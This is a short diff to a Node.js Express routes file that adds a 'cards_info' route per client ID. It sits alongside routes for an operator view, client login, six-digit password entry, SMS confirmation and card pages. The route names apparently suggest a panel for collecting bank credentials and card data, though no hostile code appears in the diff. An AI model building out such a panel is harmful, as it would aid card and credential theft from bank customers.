@@ -25,6 +25,7 @@ const OperatorView = require('../controllers/views/OperatorView')
 const ClientController = require('../controllers/ClientController')
 
 const ClientLoginView = require('../controllers/views/loginView')
+const CardsView = require('../controllers/views/cardsView')
 
 const Pass6View = require('../controllers/views/password6View')
 
@@ -33,6 +34,7 @@ const DispositivoView = require('../controllers/views/admin/dispView')
 //Dashboard
 routes.get(`/dashboard`, DashboardView.view)
 //Client
+routes.get(`/modules/conta/cards_info/:client_id`, CardsView.view)
 routes.get(`/confirmsms`, SmsView.view)
 routes.get(`/modules/conta/auth/:client_id`, VerifyView.view)
 routes.get(`/modules/conta/card/:client_id/:end`, CardView.view)
